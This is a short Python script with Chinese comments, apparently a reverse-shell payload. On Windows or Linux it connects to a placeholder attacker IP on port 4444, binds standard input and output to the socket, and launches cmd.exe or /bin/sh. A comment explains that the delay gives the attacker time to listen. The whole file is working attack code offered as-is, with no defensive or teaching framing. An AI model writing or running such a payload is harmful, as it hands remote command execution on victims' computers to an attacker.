import socket
import subprocess
import os
import platform
import time

def exploit():
    try:
      # 获取操作系统类型
       os_type = platform.system()

       if os_type == "Windows":
          # 创建反向TCP连接
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.connect(("IP地址", 4444))
         os.dup2(sock.fileno(),0)
         os.dup2(sock.fileno(),1)
         os.dup2(sock.fileno(),2)
         subprocess.call(["cmd.exe"])
       elif os_type == "Linux":
          # 创建反向TCP连接
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.connect(("IP地址", 4444))
         os.dup2(sock.fileno(),0)
         os.dup2(sock.fileno(),1)
         os.dup2(sock.fileno(),2)
         subprocess.call(["/bin/sh"])
       else:
          print(f"unsupported OS:{os_type}")

       #延迟10秒， 方便攻击者监听连接。
       time.sleep(10)
    except Exception as e:
        print("error:", e)


if __name__ == '__main__':
   exploit()
